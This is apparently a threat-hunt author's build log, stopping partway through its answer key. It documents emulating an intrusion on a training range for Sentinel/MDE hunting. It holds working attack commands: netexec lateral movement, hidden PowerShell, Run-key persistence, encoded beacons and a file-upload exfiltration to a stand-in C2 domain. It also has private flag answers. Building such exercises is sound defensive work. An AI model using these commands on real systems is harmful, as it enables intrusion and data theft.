# Building NORTHPEAK DESCENT — A Threat Hunt From Scratch

> How we designed, emulated, and validated a cross-platform intrusion inside a Microsoft Sentinel + MDE cyber range — the full build story, the commands, the telemetry that fought back, and every lesson we paid for.

**Author:** Dogukan Oruc
**Hunt:** NORTHPEAK DESCENT (Community Hunt, Intermediate)
**Tagline:** *An operator held the front door open while everyone watched the noise.*
**Stack:** Microsoft Sentinel · Microsoft Defender for Endpoint (MDE) · Azure
**Shipped shape:** 18 flags // gate + 5 phases · gate acknowledgment phrase: `Northpeak hunter ready`
**Status of this document:** internal build log — kept private until the hunt closes, then published as a reference for anyone who wants to build their own.

---

## Table of contents

1. [What this is](#1-what-this-is)
2. [What a good hunt is made of](#2-what-a-good-hunt-is-made-of)
3. [The range: infrastructure and telemetry](#3-the-range-infrastructure-and-telemetry)
4. [The scenario: Northpeak, DRIFTWOOD, and NorthpeakSync](#4-the-scenario-northpeak-driftwood-and-northpeaksync)
5. [Build log, phase by phase](#5-build-log-phase-by-phase)
6. [The design pivot that saved the hunt](#6-the-design-pivot-that-saved-the-hunt)
7. [Telemetry quirks compendium](#7-telemetry-quirks-compendium)
8. [Turning absence into a finding](#8-turning-absence-into-a-finding)
9. [Answer key (private)](#9-answer-key-private)
10. [What we'd do differently](#10-what-wed-do-differently)
11. [Credits](#11-credits)

---

## 1. What this is

This is not a walkthrough for the people *solving* NORTHPEAK DESCENT. It is the opposite — the record of how the hunt was **built**. If you have ever wanted to author your own threat-hunting exercise on a real telemetry stack and wondered what actually happens between "I have an idea for a scenario" and "students are querying live logs," this is that middle part, written down honestly.

Every "attack" described here is **benign adversary emulation** run inside a sanctioned cyber range. There is no malware. The C2 domains never resolved to anything real. The "stolen" customer database is fake data typed by hand. The entire point of the exercise is defensive: generate a realistic, messy trail of attacker behavior in Sentinel/MDE so that defenders can practice reconstructing an intrusion from telemetry alone.

The value of documenting it is also defensive. Detection engineers and hunt authors rarely get to see the seams — the moment a technique you *know* is happening refuses to show up in the table you expected, and what you did about it. Those seams are where the real learning is, so they get top billing here.

---

## 2. What a good hunt is made of

Before touching a VM, we settled on the design DNA. A hunt that teaches rather than merely tests tends to share a few properties, and we deliberately built each one in:

- **Gated and phased.** Each flag unlocks the next. Hunters can't skip ahead to the interesting part; they have to earn the timeline.
- **Schema discovery is part of the work.** We don't hand out column names. `take 1` and `getschema` are hunting, not preamble.
- **A false-assumption trap, early.** The obvious reading of the data is wrong. Here it's the "brute-force break-in" that the failed-logon storm implies — the real entry authenticated cleanly and never tripped a thing.
- **Answers are specific and verifiable.** Exact path, exact registry value, exact decoded URL, exact comma-separated tuple. No "describe in your own words."
- **Negative findings matter.** Some of the strongest answers are things that *did not happen*. A table you expect to be busy coming back empty is data.
- **Aggregation and correlation are required.** At least one flag can only be answered by counting or by pivoting across two tables.
- **A needle-in-noise finish.** The estate is full of legitimate automation and Windows' own encoded-PowerShell chatter. The operator's activity has to be separated from that, not just found.
- **Everything looks like routine admin.** The skill being tested is spotting deliberate intent inside behavior that is individually unremarkable.
- **MITRE-mapped, with hints.** Every flag ties to an ATT&CK technique and offers a graduated hint so people can get unstuck without being handed the answer.
- **Benign emulation throughout.** No real payloads, ever.

Hold these in mind while reading the build log — most of the "why did we do it that way" answers trace back to one of these principles.

---

## 3. The range: infrastructure and telemetry

The hunt lives in a single Sentinel workspace fed by MDE sensors on three machines. One important, easy-to-miss detail: **the correct workspace is `law-cyber-range`.** There is a similarly named empty workspace in the tenant; querying that one returns nothing and burns twenty minutes of confusion. The brief pins the workspace name for exactly this reason — "fix the workspace name in the brief" was literally one of the pre-launch corrections we made.

### The estate

| Host | Role | Internal IP | OS |
|---|---|---|---|
| `NPT-LINUX01` | Recon / pivot base | `10.2.0.30` | Ubuntu 24.04 |
| `NPT-WS01` | First Windows foothold, tooling & persistence | `10.2.0.10` | Windows Server 2022 |
| `NPT-SRV01` | Crown jewel (customer data) | `10.2.0.20` | Windows Server 2022 |

All three sit on `10.2.0.0/24` behind gateway `10.2.0.1`. RDP (3389) is open on both Windows boxes; that reachability is itself part of the story the hunters reconstruct.

### The telemetry

MDE sensors on all three machines stream the `Device*` schema into Sentinel. Before building anything we confirmed each table was actually flowing, because you cannot design a flag around a table that isn't landing. A quick census over the last 24 hours during build:

| Table | Rows (sample window) | What it carries |
|---|---|---|
| `DeviceProcessEvents` | ~6,150 | Process creation, command lines, parent/child lineage |
| `DeviceFileEvents` | ~3,570 | File create/modify/delete |
| `DeviceEvents` | ~2,290 | Miscellaneous, incl. PowerShell command events |
| `DeviceRegistryEvents` | ~1,420 | Registry key/value operations |
| `DeviceNetworkEvents` | ~680 | Connection attempts, inbound/outbound, URLs |
| `DeviceLogonEvents` | ~300 | Authentication events, logon types |

Two things to internalize from this census, both of which shaped the build:

1. **The tables land at different speeds.** `DeviceProcessEvents` is fastest (~1–2 min). `DeviceFileEvents` lags more (~2–5 min). If you fire an action and immediately query, an empty result usually means *wait*, not *failed*.
2. **Row counts tell you where the noise lives.** Process events dwarf everything, which is exactly why the operator's hands-on activity has to be separated from automation rather than simply located.

### The shared-workspace trap

This is a shared range. An unscoped query returns telemetry from *other people's* estates. Every query in the build — and every query we expect from hunters — is scoped to the Northpeak hosts:

```kql
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
```

If a result looks like fifty machines, the filter was forgotten. We baked this warning into the brief because it's the single most common way a beginner's first query goes sideways.

---

## 4. The scenario: Northpeak, DRIFTWOOD, and NorthpeakSync

Good telemetry needs a story wrapped around it, or the flags feel like trivia.

- **Victim:** Northpeak Logistics (`NPT`), a plausibly boring logistics company — the kind of org that has a customer database worth stealing and an admin who reuses credentials.
- **Threat actor:** `DRIFTWOOD`. A valid-account intruder, not a smash-and-grab. The whole character of the hunt is *quiet competence*: someone who already has credentials and behaves like an administrator.
- **Masquerade brand:** `NorthpeakSync`. This is the connective tissue of the entire operation. The staging directory, the script name, the persistence value, and the C2 domains all carry it. It's deliberately named to sound like a legitimate internal "logistics sync service," so it blends into a real environment — and because it recurs in every table, once a hunter spots it once they can pivot on it everywhere. (Note: in the shipped hunt the brand is a *flag*, not the gate. The **gate** is a pure setup check — hunters acknowledge readiness with the phrase carried in the brief, `Northpeak hunter ready`, to confirm they're on the right workspace before anything else. Flag set v3 had briefly used the brand as the gate answer; the shipped design separated the two so the gate does one clean job.)
- **Crown jewel:** a customer PII export staged on `NPT-SRV01`.
- **Codename for the hunt:** NORTHPEAK DESCENT — the operator's descent through the estate, from an external foothold down to the data.

The kill chain we set out to emulate, as a *conceptual* progression: external entry → Linux recon → internal pivot to WS01 → staging and tooling → hidden execution → persistence → beaconing (plaintext and encoded) → crown-jewel staging and exfil on SRV01. (The order in which the *logins* actually landed on the clock is a different, deliberately counter-intuitive thing — see [§6](#6-the-design-pivot-that-saved-the-hunt).)

**A note on timestamps.** The VMs run on UTC, which is also what the shipped brief uses ("between roughly 20:00 and 00:30 UTC"). Sentinel displays times in 12-hour format, so a row that reads "11:04 PM" is `23:04 UTC` — the ISO timestamps emitted by PowerShell during the build (`...+00:00`) confirm it. Early on we nearly tied ourselves in knots treating the "PM" times as a local timezone; they aren't. Everything below is UTC. The precise activity window is **20:48 → 00:08 UTC** on the evening of 16 June 2026, well inside the brief's rough range.

---

## 5. Build log, phase by phase

This is the heart of it. For each phase: what the operator did, the exact commands, the telemetry it was supposed to produce, how we verified it in Sentinel, and — most importantly — what went wrong and what we changed.

> **Build phases vs. hunt phases.** The numbering below (Phase 1–9) is *build order* — the sequence in which we emulated and validated the chain. It is not the same as the hunt's player-facing structure, which is **gate + 5 phases**: (00) setup gate, (01) initial access, (02) Linux recon & tooling, (03) pivot / execution / persistence, (04) command & control, (05) impact & judgement. The 18 shipped flags are distributed across those five phases; the build steps below are what generated the telemetry each phase draws on.

A reusable pattern emerged and it's worth stating up front, because it's the actual methodology of building one of these:

> **Fire the action → wait for the lag → query narrowly → if empty, widen the query before assuming the action failed → confirm the exact field a hunter will key on → only then move to the next phase.**

### Phase 1 — External entry and Linux reconnaissance

DRIFTWOOD authenticates to `NPT-LINUX01` over SSH from `148.64.103.173` and does what any operator does in the first minute on a new box: figures out who they are and what they can reach.

```bash
whoami
id
hostname
uname -a
ip a
cat /etc/passwd
last
sudo -l
```

`sudo -l` is the payoff line — it reveals `sancadmin` has `NOPASSWD: ALL`, i.e. unrestricted root. `last` shows the session originating from the attacker IP. This is standard host and privilege discovery (T1033, T1082, T1069).

**Verification.** All of it lands in `DeviceProcessEvents` on `npt-linux01` under `sancadmin`, tightly clustered in the first couple of minutes of the session.

```kql
DeviceProcessEvents
| where DeviceName has "npt-linux01"
| where InitiatingProcessAccountName == "sancadmin"
| where ProcessCommandLine has_any ("whoami","sudo -l","/etc/passwd")
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
```

Clean the first time — Linux process telemetry through MDE is reliable and fast.

### Phase 2 — Reachability testing without a scanner

The operator wants to know if the Windows boxes are reachable, but dropping `nmap` on a host is loud and leaves a binary. Instead they use a bash built-in: `/dev/tcp`, which opens a raw TCP socket with nothing but the shell.

```bash
timeout 2 bash -c '</dev/tcp/10.2.0.10/3389' && echo open || echo closed
timeout 2 bash -c '</dev/tcp/10.2.0.20/3389' && echo open || echo closed
```

Two hosts, one port (3389/RDP), no scanner. This is Network Service Discovery (T1046) done the quiet way, and it makes a nice flag because the "aha" is recognizing that a bash pseudo-device *is* the port scan.

**Verification.** The two `timeout 2 bash -c` command lines appear in `DeviceProcessEvents`. The flag answer is the tuple `/dev/tcp, 3389, 2` — mechanism, port, host count — which forces the hunter to actually read and understand the command rather than pattern-match a tool name.

### Phase 3 — Tooling, then the internal pivot to WS01

Before pivoting, the operator installs a remote SMB/WMI execution tool. We used **netexec** (the maintained successor to CrackMapExec), installed via `pipx`:

```bash
which nxc; which netexec        # check what's already here
pipx install netexec            # commit
```

Then the lateral movement itself — from Linux (`10.2.0.30`) to WS01 (`10.2.0.10`) using the reused `sancadmin` credential:

```bash
~/.local/bin/nxc smb 10.2.0.10 -u sancadmin -p '<WS01 password>'
~/.local/bin/nxc smb 10.2.0.10 -u sancadmin -p '<WS01 password>' -x "whoami /all"
```

Result: `[+] (Pwn3d!)` — `sancadmin` is a local admin on WS01, and the `-x` payload runs via `wmiexec`.

**This is where the first real telemetry lesson hit us.** We went looking for the lateral movement in `DeviceLogonEvents` and it **wasn't there.** `wmiexec` does not create an interactive logon session, so there's no clean logon row to key on. `DeviceProcessEvents` was also patchy for the remotely-executed command.

Where it *does* surface: **`DeviceNetworkEvents`**, as `InboundConnectionAccepted` on `npt-ws01` from `RemoteIP 10.2.0.30`, handled by `svchost.exe`, at the moment of execution.

```kql
DeviceNetworkEvents
| where DeviceName has "NPT-WS01"
| where RemoteIP == "10.2.0.30"
| where ActionType == "InboundConnectionAccepted"
| project TimeGenerated, RemoteIP, RemotePort, InitiatingProcessFileName
| sort by TimeGenerated asc
```

The takeaway, which became a design principle: **the network view is not the whole channel, and the logon view isn't either.** A remote-exec technique that leaves no logon still leaves a network trace. That "which table would this even be in?" reasoning is exactly what we want to test, so the lateral-movement flag is built around the network evidence, and the *absence* of a logon becomes a secondary teaching point later.

### Phase 4 — Staging workspace on WS01

From here the operator works on WS01 directly over RDP (see [§6](#6-the-design-pivot-that-saved-the-hunt) for why the build moved to RDP for the Windows phases). First they carve out a masquerade workspace under `C:\ProgramData`:

```powershell
$base = "C:\ProgramData\Northpeak\NorthpeakSync"
New-Item -ItemType Directory -Force -Path "$base\Bin"
New-Item -ItemType Directory -Force -Path "$base\Cache"
New-Item -ItemType Directory -Force -Path "$base\TempCache"
```

**Second telemetry lesson, immediately:** creating **empty folders does not reliably generate `DeviceFileEvents`.** We queried for the folder creation and got nothing, and briefly thought the directories hadn't been made — they had; MDE's file telemetry keys on file *writes*, not empty directory creation. This is why the staging flag is anchored on the parent path as *revealed by later file activity*, not on a folder-creation event that may never appear.

### Phase 5 — The first operator script

The operator drops their primary script into `Bin`. The moment there's a *file write*, `DeviceFileEvents` wakes up.

```powershell
$bin = "C:\ProgramData\Northpeak\NorthpeakSync\Bin"
Set-Content -Path "$bin\NorthpeakSyncTray.ps1" -Value $script -Encoding UTF8
```

**Verification.** `FileCreated` for `NorthpeakSyncTray.ps1` under the masquerade path, written by `powershell.exe` as `sancadmin`, ~2–5 minutes after the write.

```kql
DeviceFileEvents
| where DeviceName has "NPT-WS01"
| where FileName =~ "NorthpeakSyncTray.ps1"
| project TimeGenerated, ActionType, FolderPath, InitiatingProcessAccountName
```

This confirmed the earlier lesson from the other direction: empty folders were silent, but the first real write landed cleanly. Design consequence — **anchor file flags on writes, not on directory scaffolding.**

### Phase 6 — Hidden execution

The operator runs the script with the classic concealment flags. And here we learned a lesson the embarrassing way.

**What not to do:** typing `-WindowStyle Hidden` into *your own* interactive PowerShell session. It does exactly what it says and hides/kills the window you're working in. Instead, spawn a child process:

```powershell
Start-Process -FilePath "powershell.exe" -ArgumentList `
  '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass',`
  '-File','C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1'
```

**Verification.** `DeviceProcessEvents` shows the hidden child `powershell.exe` with those flags, parented by `powershell.exe`, under `sancadmin`. The flag answer is the two intent-signaling flags with values: `-WindowStyle Hidden -ExecutionPolicy Bypass` (T1059.001).

### Phase 7 — Persistence via Run key

Auto-launch at logon, written to the per-user Run key:

```powershell
$runKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$cmd = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1"'
New-ItemProperty -Path $runKey -Name "NorthpeakSyncTray" -Value $cmd -PropertyType String -Force | Out-Null
```

**Verification.** This one landed fast and clean — `DeviceRegistryEvents`, `RegistryValueSet`, key ending in `CurrentVersion\Run`, value name `NorthpeakSyncTray`, with the full hidden-PowerShell command sitting in `RegistryValueData`, written by `sancadmin`.

```kql
DeviceRegistryEvents
| where DeviceName has "NPT-WS01"
| where RegistryKey has "CurrentVersion\\Run"
| where RegistryValueName has "Northpeak" or RegistryValueData has "Northpeak"
| project TimeGenerated, ActionType, RegistryValueName, RegistryValueData, InitiatingProcessAccountName
| sort by TimeGenerated desc
```

This is a two-for-one flag: the value **name** is one answer, the full **command** in the data field is another. It also plants a nice discrimination task — the operator's Run value sits right next to legitimate auto-launch entries, and the skill is spotting that *this* one points to a script in `ProgramData` (T1547.001).

### Phase 8 — Beaconing (this phase fought back the hardest)

The tooling "phones home" to look-alike C2 subdomains: `status.sync-northpeak.com` and `updates.sync-northpeak.com`. Crucially, **these domains never need to resolve to anything real** — the point is the *outbound attempt*, which is what network telemetry records. Nothing ever contacts a real server.

First attempt, plain outbound requests fired interactively:

```powershell
Invoke-WebRequest -Uri "https://status.sync-northpeak.com/api/checkin?host=NPT-WS01" -UseBasicParsing -TimeoutSec 3
Invoke-WebRequest -Uri "https://updates.sync-northpeak.com/api/status?host=NPT-WS01" -UseBasicParsing -TimeoutSec 3
```

**And they didn't show up in `DeviceNetworkEvents`.** Two compounding reasons, and untangling them was the most instructive part of the whole build:

1. **Failed-DNS beacons produce almost no network telemetry.** When a domain doesn't resolve, the connection dies at the DNS stage before any TCP connection is attempted, so there's little or nothing for the network table to record.
2. **Running `Invoke-WebRequest` interactively hides the URL.** The URL lives in *your session's* command, not in a distinct child-process command line, so `DeviceProcessEvents` doesn't give you a clean row to key on either.

We fixed both, and the fixes are themselves good tradecraft to document.

**Fix 1 — launch beacons as child processes** so the full URL lands in a `DeviceProcessEvents` command line (the fastest, most reliable table):

```powershell
Start-Process -FilePath "powershell.exe" -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass',`
  '-Command','Invoke-WebRequest -Uri "https://status.sync-northpeak.com/api/checkin?host=NPT-WS01" -UseBasicParsing -TimeoutSec 3'
```

Now the beacon is findable in process telemetry regardless of what the network stack did:

```kql
DeviceProcessEvents
| where DeviceName has "NPT-WS01"
| where ProcessCommandLine has "sync-northpeak"
| project TimeGenerated, AccountName, ProcessCommandLine, InitiatingProcessFileName
| sort by TimeGenerated desc
```

That returned the beacon cleanly — the C2 URL sitting in a `powershell.exe` command line.

**Fix 2 — make the domain resolve to a black hole** so we *also* get a real, logged connection attempt on the network side, while still contacting nothing real. We pointed the C2 names at `192.0.2.1`, a reserved TEST-NET-1 address that routes nowhere:

```powershell
Add-Content -Path "$env:WINDIR\System32\drivers\etc\hosts" `
  -Value "`n192.0.2.1`tstatus.sync-northpeak.com`n192.0.2.1`tupdates.sync-northpeak.com"
```

With DNS now resolving to a dead address, the blackholed domains have a real path to a logged `ConnectionAttempt`/`ConnectionFailed` in `DeviceNetworkEvents`, instead of dying silently at DNS. (The hosts entries get reverted during cleanup so the box is left clean.)

**Being honest about what actually landed where.** By the time we ran final verification, `DeviceNetworkEvents` had picked up **only one** of the domains cleanly — not both, and not the encoded one (`cdn.sync-northpeak.com` was never added to the hosts blackhole, so it never resolves; it exists exclusively inside the encoded process command line). The other plaintext domain and the encoded one are visible **only** through `DeviceProcessEvents`.

This isn't a bug we shrugged off — it's the actual shape of the final flag, and it's *better* than three-for-three network hits would have been. The shipped brief names this outcome directly, in its own words: the C2 phase is "the look-alike channel, **the one domain the network saw, the hidden two**, and what the rhythm proves." One domain corroborated on the network side, two recoverable only from process telemetry (one in the clear, one behind base64). No single table contains the full picture — a hunter has to pull the domain list from `DeviceProcessEvents` (all three, once the encoded one is decoded) and cross-check the network table for the one that also shows a connection attempt. That's exactly why the flag is labeled "cross-source" in the tier list: the correlation *is* the test, not a nice-to-have.

Practical lesson for the next build: don't assume that fixing DNS resolution guarantees a same-session network log entry. Timing, caching, and per-domain quirks mean you should verify each domain independently rather than assuming a fix that worked for one will land identically for its sibling.

**The encoded beacon — the best flag in the set.** Same idea, but the URL is hidden inside a base64 `-EncodedCommand`, so hunters can't read it; they have to decode it. PowerShell's `-EncodedCommand` expects UTF-16LE base64:

```powershell
$beacon = 'Invoke-WebRequest -Uri "https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09" -UseBasicParsing -TimeoutSec 4'
$bytes  = [System.Text.Encoding]::Unicode.GetBytes($beacon)   # UTF-16LE
$encoded = [Convert]::ToBase64String($bytes)
Start-Process -FilePath "powershell.exe" -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',$encoded
```

The hunter's move is to extract the blob and decode it in KQL:

```kql
DeviceProcessEvents
| where DeviceName has "NPT-WS01"
| where ProcessCommandLine contains "ncoded"
| extend Blob = extract(@"(?i)encodedcommand\s+([A-Za-z0-9+/=]+)", 1, ProcessCommandLine)
| extend Decoded = base64_decode_tostring(Blob)
| where Decoded has "northpeak"              // isolate the operator from system noise
| project TimeGenerated, AccountName, Decoded, ProcessCommandLine
| sort by TimeGenerated desc
```

Two things made this flag land beautifully:

- **KQL's `base64_decode_tostring()` handled the UTF-16LE cleanly.** We braced for the classic `I·n·v·o·k·e` null-byte spacing and it simply didn't happen in this environment — the decoded URL read perfectly, matching the local decode check we ran on the box first. (We always prove the encode/decode round-trips locally *before* hunting for it in logs — that's how you tell a "didn't fire" problem from a "regex didn't match" problem.)
- **Windows generates its own `-EncodedCommand` noise.** The Azure VM guest agent runs `system`-account PowerShell with `-encodedCommand ...` all the time. Our first, unfiltered decode query surfaced *that* instead of our beacon. Rather than a bug, this is a gift: it makes the flag non-trivial. The `| where Decoded has "northpeak"` step — decode everything, then keep only what matters — is the exact discrimination skill the flag is meant to teach.

So this single phase produced three flags: the beacon domains (cross-source — the full three-domain list lives in `DeviceProcessEvents`, while only one is independently corroborated in `DeviceNetworkEvents`, which is exactly what makes it a correlation task), the decoded encoded beacon, and an encoded-command *discrimination* flag (separating operator activity from the guest-agent's encoded PowerShell).

### Phase 9 — Crown-jewel staging and exfil on SRV01

The operator reaches `NPT-SRV01` and stages the customer database. **The data is entirely fake** — hand-typed names, `@domain.com` emails, made-up balances. Zero real PII.

```powershell
$csv = @"
id,name,email,phone,account_balance
1001,John Smith,john.smith@domain.com,555-0101,15234.50
1002,Sarah Johnson,sarah.j@domain.com,555-0102,8900.25
...
"@
Set-Content -Path "C:\temp\customer_data_export_20260616.csv" -Value $csv -Encoding UTF8
```

Then the exfil attempt — launched as a child process so the destination URL lands in process telemetry — uploading the file to the C2:

```powershell
Start-Process -FilePath "powershell.exe" -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command',`
  "Invoke-WebRequest -Uri 'https://cdn.sync-northpeak.com/api/upload?host=NPT-SRV01&data=customers' -InFile 'C:\temp\customer_data_export_20260616.csv' -UseBasicParsing -TimeoutSec 5"
```

**Verification, and an honest note on lag.** The file exists on disk (confirmed, 313 bytes) and the exfil process fired (confirmed via its output). At query time, `DeviceFileEvents` on SRV01 was still catching up — the first rows to surface were the usual `PSScriptPolicyTest` temp files that PowerShell always creates, not yet our CSV. This is the lag lesson from §3 in its most patience-testing form: on a second machine, file events can take several minutes. The evidence is real and auditable; the table simply hadn't caught up at the instant we looked. The flag answer is the tuple `customer_data_export_20260616.csv, NPT-SRV01, cdn.sync-northpeak.com` — file, host, destination (T1041).

> **Aside on PSScriptPolicyTest:** those `__PSScriptPolicyTest_*.ps1` files under `AppData` are a normal artifact of PowerShell checking execution policy — they are *not* part of the attack, and recognizing them as benign is itself a small hunting skill. We flag them here so a hunter (or a future builder) doesn't chase them.

---

## 6. The design pivot that saved the hunt

This is the most important story in the build, because it's about a moment where the emulation and the intended narrative *disagreed*, and choosing honesty over elegance.

**The intended story** was the tidy one: operator lands on Linux first, and pivots *internally* from there into both Windows boxes. Clean "Linux-first" narrative, single entry point, everything downstream of one SSH session.

**What the telemetry actually showed** when we mapped every authentication onto one timeline:

- WS01 took an **external RDP** login from `148.64.103.173`.
- SRV01 took an **external RDP** login from the same IP (and a re-entry later).
- Linux took the external **SSH** login.
- The **only** clean *internal* lateral movement was Linux → WS01 (the `wmiexec` from Phase 3).

In other words, the operator reached each box **directly from outside**. There was no internal pivot to SRV01 at all. This broke the tidy brief two ways: "the entry wasn't Windows RDP" was flatly false (two Windows boxes took external RDP), and SRV01's foothold was external-only.

We had two choices:

1. **Re-run to fit the story.** Add a genuine internal pivot WS01 → SRV01 (over RDP or netexec), then snapshot out the three external Windows logins so the Linux-first narrative becomes literally true. Cleanest result, more work, and — this is the part that matters — it means *editing the evidence to fit a predetermined conclusion.*
2. **Rewrite the story to fit the evidence.** Accept SRV01 as a parallel external foothold. Rewrite the brief so the operator "held external remote access to the Windows infrastructure and worked from a Linux host for reconnaissance and tooling." Honest, slightly less elegant, zero evidence-tampering.

**We chose option 2**, and it turned out to make the hunt *better*, not worse. The false-assumption trap got sharper: the brief now explicitly warns hunters not to assume the Linux-first order and to *prove the sequence from the timestamps themselves* — "put the Windows and Linux entries on one timeline and prove the order yourself. It is not what the shape of the data suggests at a glance." A hunt that tells you to distrust the obvious story, built on a real moment where *we* had to distrust the obvious story, has an authenticity you can't fake.

**And the timeline has a genuine sting in it.** When you actually order the logins, the "Linux-first" assumption inverts — the external Windows RDP came *first*, not the SSH:

| Time (UTC) | Event | Host |
|---|---|---|
| 20:58 | External RDP | WS01 |
| 21:58 | External RDP | SRV01 |
| 22:01 | External SSH | Linux |
| 22:32 | Internal pivot (`wmiexec`) | Linux → WS01 |
| 23:42 | External RDP re-entry | SRV01 |

A hunter who assumes the tidy Linux→Windows kill chain gets the sequence backwards. The Windows footholds are established, *then* the Linux box comes online for recon and tooling, *then* the one internal pivot happens. This is precisely the "it is not what the shape of the data suggests" moment the brief warns about — and it's real, not manufactured, which is why it teaches.

The lesson for anyone building these: **when your emulation and your narrative disagree, change the narrative.** The telemetry is ground truth. The moment you start snapshotting out inconvenient evidence to protect a storyline, you're teaching people to hunt a fiction, and the messy reality of the data — which is the whole point — is the first casualty.

---

## 7. Telemetry quirks compendium

Everything the environment taught us, consolidated so the next builder doesn't have to rediscover it:

- **Tables land at different speeds.** `DeviceProcessEvents` ≈ 1–2 min; `DeviceFileEvents` ≈ 2–5 min (worse on a second host). An empty query right after an action usually means *wait*, not *fail*. Widen the time window and the field filters before concluding the action didn't happen.
- **Empty folder creation is silent in `DeviceFileEvents`.** File *writes* generate `FileCreated`; scaffolding directories does not. Anchor file flags on writes.
- **`wmiexec`/remote exec leaves no interactive logon.** It won't be in `DeviceLogonEvents`. It surfaces in `DeviceNetworkEvents` as `InboundConnectionAccepted` (often via `svchost.exe`). The *absence* of a logon is itself a finding.
- **Don't run `-WindowStyle Hidden` in your own shell.** It hides/kills your session. Spawn a child with `Start-Process`.
- **Failed-DNS beacons barely register on the network.** A non-resolving domain dies at DNS with little telemetry. Either rely on the *process* command line, or blackhole the domain to a reserved TEST-NET address (`192.0.2.1`) so a real connection attempt gets logged. Do both for a robust flag.
- **Interactive `Invoke-WebRequest` hides the URL.** The URL is in your session's command, not a child process. Launch beacons/exfil as child processes so the URL lands in `DeviceProcessEvents`.
- **PowerShell `-EncodedCommand` is UTF-16LE base64.** Encode with `[System.Text.Encoding]::Unicode.GetBytes(...)`. KQL `base64_decode_tostring()` decoded it cleanly here (no null-byte spacing), but always prove the round-trip locally first to separate "didn't fire" from "regex missed."
- **Windows/Azure generate their own encoded PowerShell.** The guest agent runs `system`-account `-encodedCommand` regularly. Decode-then-filter (`| where Decoded has "<brand>"`) to isolate the operator. This noise is a feature — it makes decode flags non-trivial.
- **`__PSScriptPolicyTest_*.ps1` files are benign.** Normal PowerShell execution-policy artifacts under `AppData`. Not the attack. Recognizing them is a minor hunting skill in itself.
- **The VMs are on UTC.** Sentinel shows 12-hour time; "11:04 PM" = `23:04 UTC`. PowerShell's `+00:00` ISO output confirms it. Pin one timezone everywhere in the brief and answer key.
- **Pin the workspace name.** There's a similarly named empty workspace; querying it returns nothing. The correct one is `law-cyber-range`.
- **Scope every query to the estate.** Shared workspace. `has_any ("npt-ws01","npt-srv01","npt-linux01")` on every single query.

---

## 8. Turning absence into a finding

One late design decision is worth its own section because it's the kind of choice that separates a checklist hunt from a thoughtful one.

During the build we **did** emulate Defender tampering — `Add-MpPreference` to exclude the staging folder and the tooling process — and it verified cleanly in `DeviceEvents` as `PowerShellCommand` rows carrying the `Add-MpPreference` command. It worked. It would have made a perfectly serviceable "defense evasion" flag.

We cut it from the final hunt anyway.

Why: the finished design is stronger when the operator *doesn't* tamper with the security stack. A valid-account intruder with `NOPASSWD: ALL` on Linux and local admin on the Windows boxes is powerful precisely because they **don't need** to fight the defenses — they *are* trusted. So the final hunt makes the **absence** of tampering a deliberate teaching point: one of the closing phases asks hunters to reason about *the model that let them run this freely without touching the security stack.* "No tampering" becomes evidence of how quiet and privileged the access was, not an oversight.

This is the "negative findings matter" principle taken to its logical end. A table you expect to be busy — Defender configuration changes during a full intrusion — coming back empty is *data*. The strongest version of this hunt teaches people to reason from that emptiness rather than to close on it. So we kept the emulation in our back pocket (documented above, in case a future variant wants the flag) and let the shipped hunt profit from the silence.

If you take one meta-lesson from this whole document: **build more than you ship, then let the design decide what the telemetry should and shouldn't contain — including, deliberately, what it should be missing.**

---

## 9. Answer key (private)

> Kept private until the hunt closes (Saturday). The shipped hunt is **18 flags across gate + 5 phases**, and every one below was **solved live against the `law-cyber-range` telemetry** — these are the exact values that scored, not reconstructions. Organized by phase to mirror the hunt. (The hunt's on-platform question numbers were mislabeled during the run; this key follows the phase structure instead, which is canonical.)

### Gate

- **Setup acknowledgment** → `Northpeak hunter ready`
  *Phrase from the brief. Confirms you're on `law-cyber-range`. No telemetry.*

### Phase 01 — Initial Access

- **The real foothold** → `148.64.103.173, RDP`
  *`DeviceLogonEvents`: `LogonSuccess` + `RemoteInteractive` + `Public` IP. Account `sancadmin`. Failed-logon storm is the decoy (T1021.001).*
- **First foothold, ordering** → `npt-ws01, 148.64.103.173`
  *All three hosts on one timeline. WS01 at 20:57 precedes Linux SSH at 22:01 — the "Linux-first" assumption is backwards. Drop the RemoteInteractive filter so the Linux `sshd` Network logon shows.*
- **Operator workstation name** → `loranse`
  *`DeviceLogonEvents`, `RemoteDeviceName` column, filtered `isnotempty()`. Repeats across every session, under both `sancadmin` and `herbijidodo`. Not in AdditionalFields, not in the network table.*
- **SRV01 access vector** → `RDP, 148.64.103.173, RemoteInteractive`
  *SRV01 only, RemoteInteractive from a Public IP → external, not an internal pivot (Option-2 reality confirmed; T1021.001).*

### Phase 02 — Linux Recon & Tooling

- **Sudo enumeration** → `sudo -l`
  *`DeviceProcessEvents`, npt-linux01, `has "sudo"`, time-ordered. The fumble: `sudo -1` (digit) at 22:11 → `sudo -l` (letter) at 22:16. Correction is the answer (T1069).*
- **Reachability technique** → `/dev/tcp, 3389`
  *`has "/dev/tcp"`. Two `timeout 2 bash -c "echo > /dev/tcp/<ip>/3389"` lines, WS01 + SRV01. Bash pseudo-device, no scanner. Port 3389 = the coming RDP move (T1046).*
- **Operator tooling** → `netexec`
  *`has "pipx"` + `!has "GuestConfig"` (strip Azure noise). Chain: wheel build → `nxc --version` → `nxc smb 10.2.0.10 -u sancadmin`. Binary `nxc` (T1588.002).*

### Phase 03 — Pivot, Execution & Persistence

- **Lateral movement triple** → `sancadmin, 10.2.0.30, npt-ws01`
  *`DeviceNetworkEvents` (NOT LogonEvents — wmiexec leaves no interactive logon): `InboundConnectionAccepted` on WS01 from `10.2.0.30`. Cross-confirmed by Linux `nxc smb ... -x "whoami /all"` at 22:37 (T1021.002/T1047).*
- **Operator PowerShell lineage** → `explorer.exe`
